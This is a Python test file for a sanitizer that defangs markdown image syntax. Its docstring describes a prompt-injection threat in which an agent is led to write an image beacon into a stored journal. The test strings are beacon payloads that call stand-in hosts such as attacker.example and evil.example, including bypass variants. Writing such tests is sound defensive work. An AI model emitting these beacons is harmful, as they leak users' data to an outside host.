"""Tests for `neutralize_remote_image_markdown` (P0-3 write-boundary strip).

Pure-function tests — no DB needed (`SimpleTestCase`). See
`content_sanitize.py` for the threat this defends against: an injected
instruction making the agent write a markdown image beacon into a durable
journal/document store.
"""

from __future__ import annotations

from django.test import SimpleTestCase

from .content_sanitize import neutralize_remote_image_markdown


class NeutralizeRemoteImageMarkdownTests(SimpleTestCase):
    def test_basic_image_stripped(self):
        self.assertEqual(
            neutralize_remote_image_markdown("![](https://attacker.example/?d=1)"),
            "[](https://attacker.example/?d=1)",
        )

    def test_titled_image_stripped(self):
        self.assertEqual(
            neutralize_remote_image_markdown('![alt](https://attacker.example "title")'),
            '[alt](https://attacker.example "title")',
        )

    def test_empty_alt_image_stripped(self):
        self.assertEqual(
            neutralize_remote_image_markdown("![](https://attacker.example/beacon.png)"),
            "[](https://attacker.example/beacon.png)",
        )

    def test_http_scheme_stripped(self):
        self.assertEqual(
            neutralize_remote_image_markdown("![a](http://attacker.example/x.png)"),
            "[a](http://attacker.example/x.png)",
        )

    def test_https_scheme_stripped(self):
        self.assertEqual(
            neutralize_remote_image_markdown("![a](https://attacker.example/x.png)"),
            "[a](https://attacker.example/x.png)",
        )

    def test_protocol_relative_stripped(self):
        self.assertEqual(
            neutralize_remote_image_markdown("![a](//attacker.example/x.png)"),
            "[a](//attacker.example/x.png)",
        )

    def test_uppercase_scheme_stripped(self):
        self.assertEqual(
            neutralize_remote_image_markdown("![a](HTTPS://ATTACKER.EXAMPLE/x.png)"),
            "[a](HTTPS://ATTACKER.EXAMPLE/x.png)",
        )

    def test_data_and_relative_urls_also_stripped(self):
        # Nothing in the app writes legitimate markdown images (any scheme),
        # so these are neutralized too, not just remote ones.
        self.assertEqual(
            neutralize_remote_image_markdown("![a](data:image/png;base64,AAAA)"),
            "[a](data:image/png;base64,AAAA)",
        )
        self.assertEqual(
            neutralize_remote_image_markdown("![a](/local/path.png)"),
            "[a](/local/path.png)",
        )

    def test_multiple_images_in_one_note(self):
        self.assertEqual(
            neutralize_remote_image_markdown("before ![a](http://x/1.png) middle ![b](https://y/2.png) after"),
            "before [a](http://x/1.png) middle [b](https://y/2.png) after",
        )

    def test_plain_link_untouched(self):
        text = "[a normal link](https://example.com)"
        self.assertEqual(neutralize_remote_image_markdown(text), text)

    def test_plain_text_untouched(self):
        text = "no images here, just text"
        self.assertEqual(neutralize_remote_image_markdown(text), text)

    def test_bang_followed_by_space_untouched(self):
        # "! [x](url)" (space between "!" and "[") is not markdown image
        # syntax — the bang must immediately precede the bracket.
        text = "! [x](https://evil.example/x)"
        self.assertEqual(neutralize_remote_image_markdown(text), text)

    def test_escaped_bang_untouched(self):
        # The author already neutralized this themselves; leave it alone.
        text = r"\![x](https://evil.example/x)"
        self.assertEqual(neutralize_remote_image_markdown(text), text)

    def test_empty_and_none_input(self):
        self.assertEqual(neutralize_remote_image_markdown(""), "")

    # ── Regression pins for bypasses found in review ────────────────────────

    def test_reference_style_image_stripped(self):
        text = "![x][1]\n\n[1]: https://evil.example/x"
        self.assertEqual(
            neutralize_remote_image_markdown(text),
            "[x][1]\n\n[1]: https://evil.example/x",
        )

    def test_angle_bracket_destination_stripped(self):
        self.assertEqual(
            neutralize_remote_image_markdown("![a](<https://evil.example/x>)"),
            "[a](<https://evil.example/x>)",
        )

    def test_nested_bracket_alt_stripped(self):
        self.assertEqual(
            neutralize_remote_image_markdown("![a[b]c](https://evil.example/x)"),
            "[a[b]c](https://evil.example/x)",
        )
